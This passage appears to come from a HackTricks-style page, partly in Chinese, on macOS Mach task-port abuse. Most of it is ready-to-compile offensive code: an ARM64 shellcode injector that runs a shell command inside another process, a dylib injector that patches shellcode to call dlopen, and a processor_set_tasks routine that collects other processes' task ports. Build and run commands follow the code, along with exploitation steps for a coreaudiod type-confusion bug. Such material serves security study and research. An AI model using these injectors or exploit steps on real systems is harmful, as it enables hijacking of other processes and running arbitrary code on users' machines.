char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> 要使其在 iOS 上工作，需要具备 `dynamic-codesigning` entitlement，才能将可写内存设为可执行。

### Dylib Injection in thread via Task port

在 macOS 中，可以通过 **Mach** 或使用 **posix `pthread` api** 操作 **threads**。我们在上一次 injection 中生成的 thread 使用的是 Mach api，因此 **不符合 posix**。

之所以能够 **inject 一个简单的 shellcode** 来执行命令，是因为它**不需要与符合 posix** 的 apis 协同工作，只需要 Mach 即可。**更复杂的 injections** 则需要 **thread** 同时**符合 posix**。

因此，为了**改进 thread**，它应该调用 **`pthread_create_from_mach_thread`**，该函数会**创建一个有效的 pthread**。然后，这个新的 pthread 可以**调用 dlopen**，从系统中**加载一个 dylib**。这样，与其编写新的 shellcode 来执行不同操作，不如直接加载自定义 libraries。<sup>[[2]](#references)</sup>

你可以在以下位置找到**示例 dylibs**（例如，其中一个会生成日志，然后你可以监听该日志）：

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

在此技术中，进程的一个线程会被劫持：


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

调用 `task_for_pid` 或 `thread_create_*` 时，内核会递增 `task` 结构体中的一个计数器，该计数器可以通过从用户模式调用 `task_info(task, TASK_EXTMOD_INFO, ...)` 进行访问。

## Exception Ports

当线程中发生异常时，该异常会被发送到线程指定的 exception port。如果线程不处理该异常，则会将其发送到 task exception ports。如果 task 不处理该异常，则会将其发送到由 launchd 管理的 host port（异常将在此处被确认）。这称为 exception triage。

请注意，通常情况下，如果报告未被正确处理，最终会由 ReportCrash daemon 处理。不过，同一 task 中的另一个线程也可以处理该异常，`PLCreashReporter` 等 crash reporting 工具就是这样做的。

## Other Objects

### Clock

任何用户都可以访问 clock 的信息，但要设置时间或修改其他设置，则必须是 root。

要获取信息，可以调用 `clock` subsystem 中的函数，例如：`clock_get_time`、`clock_get_attributtes` 或 `clock_alarm`\
要修改值，可以使用 `clock_priv` subsystem，并调用 `clock_set_time` 和 `clock_set_attributes` 等函数。

### Processors and Processor Set

processor APIs 允许通过调用 `processor_start`、`processor_exit`、`processor_info`、`processor_get_assignment` 等函数来控制单个逻辑 processor。

此外，**processor set** APIs 提供了一种将多个 processor 分组到一个组中的方式。可以调用 **`processor_set_default`** 来获取默认的 processor set。\
以下是一些用于与 processor set 交互的有趣 API：

- `processor_set_statistics`
- `processor_set_tasks`：返回 processor set 中所有 task 的 send rights 数组
- `processor_set_threads`：返回 processor set 中所有 thread 的 send rights 数组
- `processor_set_stack_usage`
- `processor_set_info`

正如[**这篇文章**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)中所述，过去可以利用此功能绕过前面提到的保护，通过调用 **`processor_set_tasks`** 并获取每个进程上的 host port，来获取其他进程的 task ports 并控制它们。<sup>[[10]](#references)</sup>\
如今需要 root 才能使用该函数，并且该功能受到保护，因此只能在未受保护的进程上获取这些 ports。<sup>[[10]](#references)</sup>

你可以通过以下代码进行尝试：

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; 通过 vtable 槽位进行间接调用
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
